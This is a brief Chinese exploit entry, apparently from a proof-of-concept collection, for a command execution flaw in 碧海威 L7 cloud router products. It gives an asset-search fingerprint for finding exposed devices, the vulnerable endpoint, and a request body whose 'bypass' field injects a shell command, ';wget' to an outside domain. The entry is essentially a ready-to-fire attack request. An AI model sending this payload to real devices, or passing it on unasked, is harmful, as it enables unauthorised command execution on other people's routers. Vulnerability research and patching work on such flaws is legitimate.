# 碧海威L7多款产品index存在命令执行漏洞

- **系统**：碧海威L7多款产品　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`product="碧海威科技-L7云路由"`
- **请求**：`POST /portal/ibilling/index.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
{"type":5,"version":2,"bypass":";wget sadvlgapra.dgrh3.cn"}
>
```

**其他**
- 碧海威 L7多款产品index存在命令执行漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 碧海威 L7云路由